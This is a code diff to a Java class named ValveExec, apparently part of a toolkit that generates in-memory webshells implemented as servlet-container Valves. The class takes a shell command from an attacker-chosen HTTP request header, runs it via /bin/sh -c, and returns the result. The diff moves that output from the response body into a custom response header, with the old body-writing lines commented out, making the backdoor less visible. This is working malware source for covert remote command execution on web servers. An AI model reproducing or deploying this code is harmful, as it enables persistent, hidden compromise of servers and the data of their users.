@@ -16,10 +16,11 @@ import java.lang.reflect.Method;
  */
 @MemShell(MemShell.Valve)
 @MemShellFunction(MemShellFunction.Exec)
-@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class ValveExec implements InvocationHandler {
 
     private static String HEADER;
+    private static String RHEADER;
     private Object targetObject;
     private Object next;
 
@@ -57,9 +58,10 @@ public class ValveExec implements InvocationHandler {
 
             Object header = invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
             String result = exec((String) header);
-            invokeMethod(servletResponse, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
-            Object writer = invokeMethod(servletResponse, "getWriter", new Class[]{}, new Object[]{});
-            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
+            invokeMethod(servletResponse, "addHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
+//            invokeMethod(servletResponse, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+//            Object writer = invokeMethod(servletResponse, "getWriter", new Class[]{}, new Object[]{});
+//            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
         } catch (Exception e) {
         }
     }
@@ -72,10 +74,8 @@ public class ValveExec implements InvocationHandler {
             cmd = new String[]{"/bin/sh", "-c", str};
         }
         InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-        return exec_result(inputStream);
-    }
 
-    public static String exec_result(InputStream inputStream) throws Exception {
+        // result
         byte[] bytes = new byte[1024];
         int len;
         StringBuilder stringBuilder = new StringBuilder();
